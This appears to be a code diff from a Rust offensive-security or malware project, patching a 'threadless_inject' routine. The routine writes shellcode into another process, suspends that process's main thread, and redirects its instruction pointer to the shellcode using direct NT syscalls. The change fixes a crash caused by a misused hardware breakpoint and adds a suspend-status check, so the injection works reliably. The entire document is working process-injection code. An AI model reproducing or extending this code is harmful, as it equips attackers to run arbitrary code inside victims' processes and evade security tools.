@@ -691,9 +691,16 @@ pub unsafe fn threadless_inject(
         _ => return Err("NtWriteVirtualMemory shellcode failed"),
     }
 
-    // 3. Suspend the main thread.
+    // 3. Suspend the main thread. Check the NTSTATUS — if suspend failed
+    //    (e.g. missing THREAD_SUSPEND_RESUME access) we MUST NOT proceed to
+    //    NtGetContextThread/NtSetContextThread on a live thread, which races
+    //    and can land a half-applied context mid-instruction.
     let mut prev_count: u32 = 0;
-    unsafe { crate::syscalls::nt_suspend_thread(rt, main_thread as usize, &mut prev_count) };
+    let susp_status =
+        unsafe { crate::syscalls::nt_suspend_thread(rt, main_thread as usize, &mut prev_count) };
+    if susp_status.is_none() || susp_status.unwrap() < 0 {
+        return Err("NtSuspendThread failed");
+    }
 
     // 4. Get thread CONTEXT (include debug registers for HWBP setup).
     let mut ctx = AlignedContext([0u8; 1232]);
@@ -712,20 +719,27 @@ pub unsafe fn threadless_inject(
         return Err("NtGetContextThread failed");
     }
 
-    // 5. Read current RIP from context (used as HWBP trigger address — the
-    //    thread's next instruction, ensuring the breakpoint fires on resume).
-    //    Set DR0 = shellcode address so the HWBP redirects execution.
-    //    DR7 = 0x1 enables DR0 as a local (task-scoped) execute breakpoint.
+    // 5. Redirect RIP (offset 0x0F8) to the shellcode. On resume, the thread's
+    //    next instruction will be the first byte of the shellcode — pure RIP
+    //    hijack, no hardware breakpoint required.
+    //
+    //    v0.3.0 ALSO set DR0=sc_addr + DR7=0x1 (local execute breakpoint) with
+    //    the intent of "HWBP redirects execution." But an x64 execute breakpoint
+    //    traps BEFORE the instruction at DR0 runs (STATUS_SINGLE_STEP), and with
+    //    DR0 == RIP == sc_addr the very first instruction raises #DB before it
+    //    executes. There was no VEH registered in this path to redirect, so the
+    //    OS terminated the target on the first dispatch — CRITICAL-16 in
+    //    docs/audits/FULL_CODE_AUDIT_2026-07-21.md. The full threadless-inject
+    //    pattern (trigger_addr in a hot API, DR0=trigger, VEH redirect) is
+    //    future work; for v0.3.1 the RIP hijack alone is sufficient and correct.
     let sc_addr = remote_base as u64;
-    ctx.0[0x48..0x48 + 8].copy_from_slice(&sc_addr.to_le_bytes()); // DR0
-    ctx.0[0x70..0x70 + 8].copy_from_slice(&0x1u64.to_le_bytes()); // DR7: enable DR0, local
-
-    // 6. Also modify RIP (offset 0x0F8) to shellcode for immediate execution
-    //    on resume; the HWBP serves as a secondary redirection mechanism if the
-    //    shellcode returns or an exception handler restores RIP.
     ctx.0[0x0F8..0x0F8 + 8].copy_from_slice(&sc_addr.to_le_bytes());
 
-    // 7. Set modified context (with debug registers) + resume.
+    // 6. Set modified context + resume.
+    //    ContextFlags left as 0x00100013 (CONTEXT_AMD64 | CONTROL | INTEGER |
+    //    DEBUG_REGISTERS) — harmless that DEBUG_REGISTERS is set; we just don't
+    //    mutate any DR fields, so NtSetContextThread restores the thread's
+    //    existing debug-register state unchanged.
     ctx.0[0x30..0x34].copy_from_slice(&0x00100013u32.to_le_bytes());
     let set_status = unsafe {
         crate::syscalls::nt_set_context_thread(
